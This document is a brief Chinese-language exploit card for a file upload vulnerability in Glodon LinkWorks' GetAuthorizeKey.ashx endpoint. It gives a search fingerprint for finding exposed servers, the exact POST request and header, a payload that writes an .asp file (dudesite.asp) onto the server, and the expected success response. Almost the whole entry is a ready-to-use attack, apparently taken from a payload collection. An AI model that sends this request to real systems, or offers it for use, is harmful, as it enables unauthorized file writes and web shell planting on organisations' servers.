# 广联达LinkWorksGetAuthorizeKey.ashx文件上传漏洞

- **系统**：广联达LinkWorksGetAuthorizeKey.ashx　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="Services/Identification/login.ashx"`
- **请求**：`POST /Services/FileService/UserFiles/GetAuthorizeKey.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
cmd=&destDir=./sysinfo/&destFilename=dudesite.asp
```
- **预期**：200　|　key